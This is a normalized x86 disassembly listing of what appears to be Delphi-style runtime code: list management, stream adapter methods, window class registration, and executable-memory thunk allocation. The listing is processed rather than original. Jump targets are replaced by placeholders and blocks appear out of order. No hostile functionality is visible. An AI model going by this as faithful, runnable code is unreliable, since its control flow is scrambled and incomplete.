lea eax [ ebx + 0x14 ]
call sub_40d078
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx [ esi + 0x8 ]
dec edx
mov eax esi
call sub_413d6c
mov cl 0x1
mov edx ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_419924
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
cmp eax [ esi + 0x4 ]
je r-xdata
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_413dc8
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ ebx + 0x14 ] eax
or [ ebx + 0x1c ] 0x100
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_413c10
mov edx ebx
mov eax esi
call sub_419924
sub_4199b8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_413c10
mov [ esi + 0x4 ] ebx
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ ebx + 0x10 ] eax
sub_4199e4
push ebx
mov ebx eax
xor eax eax
mov [ edx + 0x4 ] eax
mov eax [ ebx + 0x10 ]
call sub_413eb0
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
call sub_403104
xor eax eax
mov [ ebx + 0x10 ] eax
sub_419a0c
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_403300
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx ebx
mov eax edi
mov esi [ eax ]
call [ esi + 0x20 ]
mov edx ebx
mov eax edi
call sub_4199b8
mov dl 0x1
mov eax ebx
call sub_419f2c
test [ edi + 0x1c ] 0x10
je r-xdata
xor ecx ecx
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop edi
pop esi
pop ebx
retn
mov cl 0x1
mov dl 0x1
mov eax ebx
call sub_419edc
sub_419a64
push ebx
push esi
push edi
mov ebx edx
mov esi eax
push 0x0
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x20 ]
mov cl 0x1
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
xor edx edx
mov eax ebx
call sub_419f2c
mov edx ebx
mov eax esi
call sub_4199e4
pop edi
pop esi
pop ebx
retn
sub_419a9c
push ebx
push esi
push edi
mov esi eax
jmp r-xdata
mov ebx [ esi + 0x10 ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_413e54
mov edi eax
test [ edi + 0x1d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
call sub_419a64
jmp r-xdata
mov ax [ r-xdata ]
and ax [ esi + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov edx edi
mov eax esi
call sub_4199e4
sub_419af4
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
or [ ebx + 0x1c ] 0x8
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_413d6c
call sub_419af4
inc edi
dec esi
jne r-xdata
sub_419b30
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
pop ebx
retn
call sub_413eb0
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
call sub_403104
xor eax eax
mov [ ebx + 0x14 ] eax
sub_419b54
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_419b30
mov edx ebx
mov eax esi
call sub_419b30
pop esi
pop ebx
retn
sub_419b70
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
cmp [ esp ] 0x1
jne r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx edi
mov eax esi
call sub_419b54
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_413d6c
mov cl [ esp ]
mov edx edi
mov ebp [ eax ]
call [ ebp + 0x10 ]
dec ebx
mov eax [ esi + 0x10 ]
mov eax [ eax + 0x8 ]
cmp ebx eax
jl r-xdata
test ebx ebx
jge r-xdata
mov ebx eax
dec ebx
sub_419bcc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
push ebx
push sub_419978
push ebx
push sub_4199a0
mov ax [ ebx + 0x18 ]
cmp ax [ ebp - 0x4 ]
setne cl
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_41998c
push ebx
push sub_4199ac
mov ax [ ebp - 0x2 ]
cmp ax [ ebx + 0x1a ]
setne cl
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ eax + 0x18 ]
mov [ ebp - 0x4 ] eax
sub_419cc4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test edi edi
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_407b44
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebx + 0x4 ] 0x0
je r-xdata
cmp ebx [ edi + 0x4 ]
jne r-xdata
push esi
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ ebx + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov edx esi
mov eax ebx
call sub_419d5c
test eax eax
je r-xdata
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b618
call sub_403890
sub_419d5c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
cmp [ esp ] 0x0
je r-xdata
xor esi esi
cmp [ edi + 0x10 ] 0x0
je r-xdata
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor ebp ebp
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
dec ebx
jne r-xdata
mov eax [ edi + 0x10 ]
mov edx ebp
call sub_413d6c
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esp ]
call sub_407b44
test al al
jne r-xdata
sub_419dac
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x8 ]
mov edx esi
call sub_404260
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
mov eax esi
call sub_407cc8
test al al
jne r-xdata
push esi
mov ecx [ ebx + 0x8 ]
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0x20 ]
push esi
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0x20 ]
jmp r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b618
call sub_403890
xor edx edx
mov eax ebx
call sub_419f2c
mov edx esi
mov eax ebx
call sub_419e38
mov dl 0x1
mov eax ebx
call sub_419f2c
sub_419e4c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_413d6c
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ecx esi
mov eax [ r-xdata ]
call sub_413cf8
sub_419e88
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x10 ]
mov edx ebx
call sub_413dc8
test eax eax
jl r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ edx + 0x10 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_413c5c
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx ebx
mov edx esi
call sub_413de8
sub_419edc
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebx edx
mov esi eax
test bl bl
je r-xdata
and [ esi + 0x1c ] 0xffef
or [ esi + 0x1c ] 0x10
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_419e78
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
cmp [ esp ] 0x0
je r-xdata
inc ebp
xor edi edi
mov edx edi
mov eax esi
call sub_419e4c
mov cl 0x1
mov edx ebx
call sub_419edc
inc edi
dec ebp
jne r-xdata
sub_419f2c
push ebx
push esi
push edi
add esp 0xffffff00
mov ebx edx
mov edi eax
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
add esp 0x100
pop edi
pop esi
pop ebx
retn
mov eax esp
mov edx [ edi + 0x8 ]
mov ecx 0xff
call sub_4040f0
mov edx esp
mov eax esi
call sub_4033d8
test eax eax
je r-xdata
test bl bl
je r-xdata
xor edx edx
mov [ eax ] edx
mov [ eax ] edi
jmp r-xdata
sub_419f74
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_419f9c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_419fe4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
push edi
push esi
mov eax [ ebx + 0x20 ]
push eax
mov eax [ eax ]
call [ eax ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_4031b8
test al al
je r-xdata
mov eax 0x80004002
jmp r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41a024
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_41a044
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_41a068
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030d4
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_41a0b0
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030f4
test bl bl
jle r-xdata
mov edx esi
call sub_41a2e0
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_41a118
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov [ ebx + 0x10 ] esi
test esi esi
je r-xdata
mov edx ebx
call sub_41a2e0
mov edx ebx
mov eax esi
call sub_41a2d4
sub_41a15c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419854
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ esi + 0x50 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax esi
pop esi
pop ebx
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_41a1a0
push ebx
push esi
push edi
call sub_403490
mov ebx edx
mov edi eax
mov edx ebx
and dl 0xfc
mov eax edi
call sub_4198a0
mov eax [ edi + 0x30 ]
test eax eax
je r-xdata
mov esi [ edi + 0x50 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx edi
call sub_419b54
jmp r-xdata
mov eax esi
call sub_413e54
mov edx eax
mov eax edi
call sub_41a2e0
lea eax [ edi + 0x50 ]
call sub_40d078
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403478
sub_41a200
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_419b70
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x30 ]
jne r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
sub_41a22c
push ebx
cmp [ eax + 0x42 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov al 0x1
pop ebx
retn
sub_41a248
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
mov al 0x1
pop ebx
retn
sub_41a264
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x40 ]
jne r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x44 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x40 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x44 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx edi
mov eax [ ebx + 0x50 ]
call sub_413d6c
mov edx [ eax ]
call [ edx + 0x10 ]
inc edi
dec esi
jne r-xdata
sub_41a2e0
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
xor eax eax
mov [ ebp + 0x10 ] eax
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_413c5c
jmp r-xdata
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_413d6c
cmp ebp eax
jne r-xdata
sub_41a320
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x30 ] eax
test eax eax
je r-xdata
mov edx ebx
call sub_419b54
mov edx ebx
call sub_419924
sub_41a34c
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030d4
mov [ edi + 0xc ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x10 ] al
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_41a394
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
cmp [ esi + 0x10 ] 0x1
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030f4
test bl bl
jle r-xdata
mov eax [ esi + 0xc ]
call sub_403104
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_41a3cc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_41a41b
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41a434
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_41a483
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41a49c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_41a506
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jl r-xdata
mov ebx 0x80030001
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp ebx 0x2
jle r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
mov eax [ esi + 0xc ]
mov ecx ebx
mov edx [ ebp + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ eax ] edx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x4 ] edx
sub_41a520
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_41a569
push [ fs : eax ]
mov [ fs : eax ] esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebx + 0xc ]
call sub_415a48
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ ebp + 0x10 ]
jne r-xdata
je r-xdata
cmp eax [ ebp + 0xc ]
xor ebx ebx
mov ebx 0x80004005
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_41a584
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
call sub_405568
xor eax eax
push ebp
push sub_41a771
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1c ] 0x0
xor edx edx
push ebp
push j_sub_4035a4#6
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x100000
jbe r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0xc ] 0x100000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_4026bc
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_41a739
push [ fs : edx ]
mov [ fs : edx ] esp
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x10 ] 0x0
ja r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4026dc
mov eax [ ebp + 0x1c ]
test eax eax
je r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x1c ]
mov edx [ ebp - 0x20 ]
mov [ eax ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0x4 ] edx
mov esi [ ebp + 0x10 ]
mov esi 0x7fffffff
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x4 ] edx
cmp esi [ ebp - 0xc ]
jle r-xdata
test esi esi
jle r-xdata
mov eax esi
mov eax [ ebp - 0xc ]
jmp r-xdata
mov eax ebx
cdq
add [ ebp - 0x18 ] eax
adc [ ebp - 0x14 ] edx
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x24 ]
add [ ebp - 0x20 ] eax
adc [ ebp - 0x1c ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
call sub_40393c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0xc ]
xchg ecx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
test ebx ebx
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a778
lea eax [ ebp + 0xc ]
call sub_4054f4
retn
sub esi ebx
mov eax ebx
cdq
sub [ ebp + 0x10 ] eax
sbb [ ebp + 0x14 ] edx
test esi esi
jg r-xdata
call sub_40393c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0x80004005
sub_41a7b4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
xor esi esi
xor eax eax
push ebp
push sub_41a817
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebx + 0x4 ] 0x2
mov eax [ edi + 0xc ]
mov edx [ eax ]
call [ edx ]
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x18 ] eax
xor eax eax
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x20 ] eax
xor eax eax
mov [ ebx + 0x24 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41a848
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_4140d8
mov edi eax
xor eax eax
push ebp
push sub_41a89d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a8a4
mov eax [ rw-data ]
call sub_41413c
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_413d6c
call sub_403104
inc esi
dec ebx
jne r-xdata
sub_41a8bc
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov edx esp
mov eax [ ecx + 0x4 ]
call [ ecx ]
add esp 0xc
pop eax
pop ebp
retn 0x10
sub_41a8e4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
cmp [ edi ] 0x0
jne r-xdata
mov eax [ edi ]
mov ebx [ edi ]
mov edx [ ebx + 0x5 ]
mov [ edi ] edx
mov edx [ ebp + 0x8 ]
mov [ ebx + 0x5 ] edx
mov edx [ ebp + 0xc ]
mov [ ebx + 0x9 ] edx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0x40
push 0x1000
push 0x1000
push 0x0
call VirtualAlloc
mov esi eax
mov eax [ rw-data ]
mov [ esi ] eax
lea edx [ esi + 0x4 ]
mov eax rw-data
mov ecx 0x2
call sub_4028b8
mov edx sub_41a8bc
lea eax [ esi + 0x5 ]
call sub_41a8dc
mov [ esi + 0x6 ] eax
lea ebx [ esi + 0xa ]
mov [ ebx ] 0xe8
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_41a8dc
mov [ ebx + 0x1 ] eax
mov eax [ edi ]
mov [ ebx + 0x5 ] eax
mov [ edi ] ebx
add ebx 0xd
mov eax ebx
sub eax esi
cmp eax 0xffc
jl r-xdata
mov [ rw-data ] esi
sub_41a9a0
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov eax [ rw-data ]
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test al al
je r-xdata
mov edx DefWindowProcA
cmp edx [ ebp - 0x24 ]
je r-xdata
push rw-data
call RegisterClassA
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call UnregisterClassA
push 0x80000000
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov ecx r-xdata
mov edx [ rw-data ]
mov eax 0x80
call sub_406868
mov ebx eax
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41a8e4
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
sub_41aa54
push ebx
push esi
mov esi eax
push 0xfffffffc
push esi
call GetWindowLongA
mov ebx eax
push esi
call DestroyWindow
cmp ebx DefWindowProcA
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_41a97c
sub_41aa7c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41ab20
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ab27
retn
mov eax [ rw-data ]
call sub_41355c
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
call sub_41a848
xor edx edx
xor eax eax
call sub_416a78
mov eax rw-data
call sub_40d078
call sub_405c24
lea eax [ eax + 0xc ]
call sub_40d078
mov eax rw-data
call sub_40d078
mov eax rw-data
call sub_4054f4
mov eax sub_41a8b4
call sub_405390
mov eax rw-data
call sub_40d078
call sub_419674
mov eax rw-data
call sub_40d078
mov eax rw-data
call sub_4054f4
sub_41ab2c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41abb5
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41abbc
retn
call sub_419640
mov eax sub_41a8b4
call sub_405388
